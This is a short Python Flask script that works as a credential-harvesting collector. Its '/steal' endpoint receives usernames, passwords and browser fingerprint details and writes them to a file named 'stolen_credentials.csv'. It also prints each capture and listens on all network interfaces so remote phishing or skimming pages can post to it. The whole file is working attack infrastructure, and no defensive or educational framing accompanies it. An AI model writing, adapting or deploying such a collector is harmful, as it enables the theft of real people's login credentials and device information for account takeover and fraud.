from flask import Flask, request, jsonify
import csv
import os

app = Flask(__name__)

LOG_FILE = 'stolen_credentials.csv'

# Create CSV header if file doesn't exist
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['timestamp', 'username', 'password', 'user_agent', 'platform', 'screen', 'timezone'])

@app.route('/steal', methods=['POST'])
def steal():
    try:
        data = request.get_json()
        
        # Extract fields
        username = data.get('username', 'N/A')
        password = data.get('password', 'N/A')
        ua = data.get('user_agent', 'N/A')
        platform = data.get('platform', 'N/A')
        screen = data.get('screen', 'N/A')
        tz = data.get('timezone', 'N/A')
        ts = data.get('timestamp', 'N/A')
        
        # Log to CSV
        with open(LOG_FILE, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([ts, username, password, ua, platform, screen, tz])
            
        print(f"[CAPTURE] {username} : {password} ({platform} @ {tz})")
        
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    # Run on 0.0.0.0 so it's accessible from outside the machine
    app.run(host='0.0.0.0', port=8000, debug=True)